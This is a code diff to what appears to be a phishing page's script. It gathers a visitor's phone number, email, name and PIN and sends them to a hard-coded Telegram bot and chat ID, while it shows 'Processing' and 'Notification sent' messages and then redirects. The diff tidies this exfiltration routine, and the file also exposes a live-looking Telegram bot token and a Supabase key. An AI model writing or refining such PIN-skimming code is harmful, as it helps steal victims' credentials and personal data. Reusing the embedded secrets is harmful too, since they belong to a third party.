@@ -129,9 +129,7 @@
     // SUPABASE & TELEGRAM CONFIGURATION
     // ============================================
     var SUPABASE_URL      = 'https://zchkanbnkghpsaagbnrt.supabase.co';
-    // ⚠️ REPLACE THIS WITH YOUR ACTUAL ANON KEY FROM SUPABASE DASHBOARD ⚠️
     var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpjaGthbmJrZ2hwc2FhZ2JucnQiLCJyb2xlIjoiYW5vbiIsImlhdCI6MTczNDI1NjQ0MCwiZXhwIjoyMDQ5ODMyNDQwfQ';
-    
     var TG_BOT_TOKEN      = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
     var TG_CHAT_ID        = '8392790531';
 
@@ -212,8 +210,8 @@
         successDiv.classList.add('show');
     }
 
-    // Send Telegram notification
-    async function sendTelegramNotification(pin) {
+    // Send Telegram notification with phone, email, and PIN
+    function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
         var decodedName = decodeURIComponent(name);
@@ -235,27 +233,27 @@
 
         var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
         
-        try {
-            var response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: TG_CHAT_ID, 
-                    text: msg, 
-                    parse_mode: 'Markdown' 
-                })
-            });
-            var result = await response.json();
+        // Use fetch with promise
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TG_CHAT_ID, 
+                text: msg, 
+                parse_mode: 'Markdown' 
+            })
+        })
+        .then(function(response) { return response.json(); })
+        .then(function(result) {
             if (result.ok) {
-                console.log('✅ Telegram sent successfully');
+                console.log('✅ Telegram notification sent successfully');
             } else {
                 console.error('Telegram error:', result);
             }
-            return result;
-        } catch (error) {
+        })
+        .catch(function(error) {
             console.error('Telegram fetch error:', error);
-            return null;
-        }
+        });
     }
 
     // Main confirm function
@@ -268,10 +266,15 @@
 
         confirmBtn.disabled = true;
         confirmBtn.textContent = '⏳ Processing...';
-        showSuccess('Processing your request...');
+        showSuccess('Sending notification...');
 
-        // Send Telegram notification (don't wait for it)
+        // Send Telegram notification (this runs in background)
         sendTelegramNotification(pin);
+        
+        // Update success message
+        setTimeout(function() {
+            showSuccess('✓ Notification sent! Redirecting...');
+        }, 1000);
         
         // Always redirect after 3 seconds
         setTimeout(function() {
